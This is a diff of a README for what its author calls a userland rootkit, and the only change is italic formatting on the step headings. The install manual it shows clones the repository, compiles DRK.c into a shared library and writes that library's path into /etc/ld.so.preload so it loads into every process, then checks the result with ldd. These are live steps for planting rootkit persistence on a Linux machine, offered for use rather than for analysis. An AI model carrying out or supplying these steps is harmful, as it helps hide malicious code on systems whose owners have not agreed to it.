@@ -10,22 +10,22 @@ Welcome to my rootkit userland This toolkit offers some cool and interesting fun
 ```
 ## INSTALL MANUAL
 
-1) git clone:
+1) *git clone*:
 ```
 git clone https://github.com/DARKSECshell/ROOTKIT-USERLAND
 ```
 
-3) userland rootkit compilation
+3) *userland rootkit compilation*
 ```
 gcc DRK.c -o DRK.so -shared -fPIC -ldl
 ```
 
-5) moved library for /etc/ld.so.preload
+5) *moved library for /etc/ld.so.preload*
 ```
 echo "$(pwd)/DRK.so" > /etc/ld.so.preload && ldconfig
 ```
 
-7) Check rk loading
+7) *Check rk loading*
 ```
 ldd /usr/bin/ls
 ```
